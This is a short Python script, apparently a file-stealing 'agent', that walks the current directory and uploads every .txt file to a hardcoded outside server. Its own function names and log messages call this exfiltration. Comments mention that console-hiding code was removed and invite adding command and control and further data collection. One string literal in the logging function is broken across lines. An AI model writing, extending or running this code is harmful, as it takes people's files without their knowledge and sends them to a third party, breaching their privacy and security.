import os
import time
import requests
import json
import base64
import sys

# Hardcode URL as requested
SERVER_URL = "https://tu-app.up.railway.app" # User needs to replace with actual Railway app URL
UPLOAD_ENDPOINT = f"{SERVER_URL}/api/upload"

CONFIG_FILE = 'sync_config.json'

def log(message):
    try:
        with open('sync_log.txt', 'a') as f:
            f.write(f'[{time.ctime()}] {message}
')
    except Exception as e:
        print(f"Error writing to log file: {e}")

def load_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    return {}

def save_config(config):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=4)

def exfiltrate_files():
    print('Buscando archivos...')
    log("Starting file exfiltration...")
    current_directory = "."
    for root, _, files in os.walk(current_directory):
        for file in files:
            if file.endswith(".txt"):
                file_path = os.path.join(root, file)
                try:
                    with open(file_path, 'rb') as f:
                        file_content = f.read()
                    
                    print(f'Enviando a {UPLOAD_ENDPOINT}...')
                    files_payload = {'file': (file, file_content)}
                    response = requests.post(UPLOAD_ENDPOINT, files=files_payload)
                    
                    print(f'Respuesta: {response.status_code}')
                    if response.status_code == 200:
                        log(f"Successfully exfiltrated {file_path}")
                    else:
                        log(f"Failed to exfiltrate {file_path}. Status code: {response.status_code}, Response: {response.text}")
                except Exception as e:
                    log(f"Error exfiltrating {file_path}: {e}")
                    print(f"Error exfiltrating {file_path}: {e}")
    log("File exfiltration complete.")
    print("Exfiltration complete.")

def main():
    print("Agent started.")
    log("Agent started.")
    
    # Removed config.get('server_url') as URL is now hardcoded
    # Removed hide_console() and show_console() as console will be visible

    exfiltrate_files()

    # Keep the agent running for demonstration purposes or background tasks
    while True:
        time.sleep(60) # Wait for 1 minute before checking again
        # Add other agent functionalities here, e.g., command and control, data collection

if __name__ == "__main__":
    main()
